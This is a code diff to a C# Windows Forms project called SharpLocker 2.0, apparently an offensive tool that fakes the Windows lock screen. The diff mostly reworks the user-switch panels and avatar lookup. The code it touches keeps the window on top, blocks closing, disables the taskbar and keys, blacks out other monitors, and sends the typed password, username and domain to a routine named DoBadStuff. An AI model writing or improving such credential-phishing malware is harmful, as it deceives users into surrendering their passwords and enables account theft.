@@ -35,9 +35,9 @@ namespace SharpLocker_2._0
 
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
-            #if !DEBUG
+#if !DEBUG
                 e.Cancel = DenyClose;
-            #endif
+#endif
         }
 
         protected override CreateParams CreateParams
@@ -59,15 +59,15 @@ namespace SharpLocker_2._0
             if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;
 
             DenyClose = false;
-            #if !DEBUG
+#if !DEBUG
                 KeyPressHandler.Enable();
-            #endif
+#endif
             DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
 
             Close();
         }
 
-#region "Password"
+        #region "Password"
 
         private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
@@ -117,9 +117,9 @@ namespace SharpLocker_2._0
             PasswordTextBox.Select(0, 0);
         }
 
-#endregion
+        #endregion
 
-#region "Init"
+        #region "Init"
 
         private void WindowsLogin_Load(object sender, EventArgs e)
         {
@@ -144,11 +144,11 @@ namespace SharpLocker_2._0
         {
             DenyClose = true;
             CapsLockLabel.Visible = false;
-            #if DEBUG
-                TopMost = false;
-            #else
+#if DEBUG
+            TopMost = false;
+#else
                 TopMost = true;
-            #endif
+#endif
 
         }
 
@@ -166,16 +166,16 @@ namespace SharpLocker_2._0
 
         private void InitializeTaskbar()
         {
-            #if !DEBUG
+#if !DEBUG
                 KeyPressHandler.Disable();
-            #endif
+#endif
         }
 
         private void InitializeUserLabel()
         {
             try
             {
-                UserNameLabel.Text = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
+                UserNameLabel.Text = UserPrincipal.Current.DisplayName;
             }
             catch
             {
@@ -222,28 +222,9 @@ namespace SharpLocker_2._0
         {
             Image img = null;
 
-            string[] pathArr = Path.GetTempPath().Split('\\');
-            string[] userDomainFromPath = pathArr[2].Split('.');
+            string path = Path.GetTempPath();
 
-            try
-            {
-                switch (userDomainFromPath.Length)
-                {
-                    case 1:
-                        pathArr[2] = username;
-                        break;
-
-                    case 2:
-                        userDomainFromPath[0] = username;
-                        pathArr[2] = string.Join(".", userDomainFromPath);
-                        break;
-                }
-            }
-            catch { }
-
-            string path = string.Join("\\", pathArr);
-
-            if (string.IsNullOrEmpty(username))
+            if (string.IsNullOrEmpty(username) || username == "Other User")
                 img = Properties.Resources.defaultAvatar;
 
             if (img is null)
@@ -293,12 +274,12 @@ namespace SharpLocker_2._0
 
         private void InitializeOtherScreens()
         {
-            #if !DEBUG
+#if !DEBUG
                 foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
                 {
                     new Task(() => BlackScreen(screen)).Start();
                 }
-            #endif
+#endif
         }
 
         private void BlackScreen(Screen screen)
@@ -330,92 +311,104 @@ namespace SharpLocker_2._0
 
         private void InitializeOtherUsers()
         {
-            const int UF_ACCOUNTDISABLE = 0x0002;
-            int buttonCounter = 0;
-
-            AddChangeUserButton(null, buttonCounter);
-            buttonCounter++;
-
-            DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
-            foreach (DirectoryEntry user in localMachine.Children)
-            {
-                if (user.SchemaClassName != "User") continue;
-                if (((int)user.Properties["UserFlags"].Value & UF_ACCOUNTDISABLE) == UF_ACCOUNTDISABLE) continue;
-                if (user.Name == "Admin") continue;
-
-                AddChangeUserButton(user, buttonCounter);
-                buttonCounter++;
-            }
-
+            AddChangeUserPanel("Other User", 0);
+            AddChangeUserPanel(UserPrincipal.Current.DisplayName, 1);
         }
 
-        private void AddChangeUserButton(DirectoryEntry user, int buttonCount)
+        private void AddChangeUserPanel(string user, int panelCount)
         {
-            int buttonX = 12;
-            int buttonY = 388;
-            int buttonWidth = 200;
-            int buttonHeight = 50;
-            int pictureBoxXOffset = 10;
-            int pictureBoxYOffset = 2;
+            int panelX = 12;
+            int panelY = 388;
+            int panelWidth = 200;
+            int panelHeight = 50;
 
-            Button b = new Button()
+            int pictureBoxOffset = 8;
+            int pictureBoxX = pictureBoxOffset;
+            int pictureBoxHeight = (int)(panelHeight * 0.9);
+            int pictureBoxY = (int)((panelHeight - pictureBoxHeight) * 0.58);
+            int pictureBoxWidth = pictureBoxHeight;
+
+            int buttonX = pictureBoxWidth + pictureBoxOffset;
+            int buttonY = 0;
+            int buttonWidth = panelWidth - pictureBoxWidth;
+            int buttonHeight = panelHeight;
+
+            Panel p = new Panel()
             {
                 Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
-                Location = new Point(buttonX, buttonY + buttonHeight * buttonCount * -1),
-                Size = new Size(buttonWidth, buttonHeight),
-                FlatStyle = FlatStyle.Flat,
+                Location = new Point(panelX, panelY + panelHeight * panelCount * -1),
+                Size = new Size(panelWidth, panelHeight),
+                BorderStyle = BorderStyle.None,
                 BackColor = Color.Transparent,
-                Font = new Font("Microsoft Sans Seri", 12),
-                ForeColor = Color.White,
                 BackgroundImageLayout = ImageLayout.Stretch
             };
 
-            b.FlatAppearance.BorderSize = 0;
-            b.FlatAppearance.MouseOverBackColor = Color.LightGray;
-            b.Paint += (s, e) =>
+            if (!(user is null) && user == UserPrincipal.Current.DisplayName) p.BackgroundImage = Properties.Resources.defaultButtonBackground;
+
+            p.MouseEnter += (s, e) =>
             {
-                e.Graphics.DrawString(FindDisplayName(user), b.Font, Brushes.White, buttonHeight + pictureBoxXOffset * 2, buttonHeight * 0.25f);
+                p.BackColor = Color.LightGray;
             };
 
-            if (!(user is null) && user.Name == Environment.UserName) b.BackgroundImage = Properties.Resources.defaultButtonBackground;
+            p.MouseLeave += (s, e) =>
+            {
+                p.BackColor = Color.Transparent;
+            };
 
             PictureBox pb = new PictureBox()
             {
                 BackColor = Color.Transparent,
                 Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                 BackgroundImageLayout = ImageLayout.Stretch,
-                Location = new Point(buttonX + pictureBoxXOffset, (buttonY + pictureBoxYOffset / 2) + buttonHeight * buttonCount * -1),
-                Size = new Size(buttonHeight - pictureBoxYOffset, buttonHeight - pictureBoxYOffset)
+                Size = new Size(pictureBoxWidth, pictureBoxHeight),
+                Location = new Point(pictureBoxX, pictureBoxY)
             };
 
-            SetUserIconByName(user is null ? "" : user.Name, pb);
-
-            Controls.Add(pb);
-            Controls.Add(b);
-        }
-
-        private string FindDisplayName(DirectoryEntry user)
-        {
-            string displayName = "";
-
-            if (user is null)
-                return "Other User";
-
-            try
+            pb.MouseEnter += (s, e) =>
             {
-                if (string.IsNullOrEmpty(displayName))
-                    displayName = UserPrincipal.FindByIdentity(UserPrincipal.Current.Context, user.Name).DisplayName;
-            }
-            catch { }
+                p.BackColor = Color.LightGray;
+            };
 
-            if (string.IsNullOrEmpty(displayName))
-                return user.Name;
+            pb.MouseLeave += (s, e) =>
+            {
+                p.BackColor = Color.Transparent;
+            };
 
-            return displayName;
+            Button b = new Button()
+            {
+                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
+                Size = new Size(buttonWidth, buttonHeight),
+                Location = new Point(buttonX, buttonY),
+                FlatStyle = FlatStyle.Flat,
+                BackColor = Color.Transparent,
+                Font = new Font("Segoe UI", 13),
+                ForeColor = Color.White,
+                Text = user,
+                TextAlign = ContentAlignment.MiddleLeft
+            };
+
+            b.MouseEnter += (s, e) =>
+            {
+                p.BackColor = Color.LightGray;
+            };
+
+            b.MouseLeave += (s, e) =>
+            {
+                p.BackColor = Color.Transparent;
+            };
+
+            b.FlatAppearance.BorderSize = 0;
+            b.FlatAppearance.MouseOverBackColor = Color.Transparent;
+            b.FlatAppearance.MouseDownBackColor = Color.Transparent;
+
+            SetUserIconByName(user, pb);
+
+            p.Controls.Add(pb);
+            p.Controls.Add(b);
+            Controls.Add(p);
         }
-
     }
 
-#endregion
+    #endregion
 
 }
